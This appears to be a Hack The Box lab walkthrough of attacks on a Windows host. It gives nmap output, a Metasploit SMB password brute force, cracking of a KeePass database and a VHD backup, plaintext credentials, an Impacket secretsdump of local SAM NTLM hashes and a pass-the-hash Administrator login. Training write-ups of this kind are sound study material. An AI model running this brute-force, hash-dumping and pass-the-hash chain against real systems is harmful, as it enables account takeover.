Interesting username: Johanna

### Nmap Scan Results
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 14:12 EDT
Nmap scan report for 10.129.200.179
Host is up (0.22s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-04-13T18:13:16+00:00; +5s from scanner time.
| ssl-cert: Subject: commonName=WINSRV
| Not valid before: 2024-04-12T18:11:40
|_Not valid after:  2024-10-12T18:11:40
| rdp-ntlm-info: 
|   Target_Name: WINSRV
|   NetBIOS_Domain_Name: WINSRV
|   NetBIOS_Computer_Name: WINSRV
|   DNS_Domain_Name: WINSRV
|   DNS_Computer_Name: WINSRV
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-13T18:13:07+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-13T18:13:11
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5s, deviation: 0s, median: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.99 seconds
```

### SMB Brute Force

Starting smb brute force with the module `auxiliary/scanner/smb/smb_login` from Metasploit, with the username Johanna and the mutated password list.

Found credentials: Johanna:1231234!

Connected to RDP with the credentials

### kdbx file

Brute Forcing the kdbx file found in the documents folder:
![[Pasted image 20240413222522.png]]

Found password: Qwerty7!

### Found Credentials in the KeePass File
![[Pasted image 20240413223948.png]]

david:gRzX7YbeTcDG7

### SMB Share
![[Pasted image 20240413224329.png]]

### Cracking Backup.vhd
![[Pasted image 20240413230158.png]]

123456789!

Found SAM and SYSTEM files inside the drive.

### Dumped hashes
```
# python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.12.0.dev1+20230928.173259.06217f05 - Copyright 2023 Fortra

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
[*] Cleaning up...
```

### Logging in With the Administrator's Hash
![[Pasted image 20240413232352.png]]

### Getting the flag
![[Pasted image 20240413232526.png]]

HTB{PWcr4ck1ngokokok}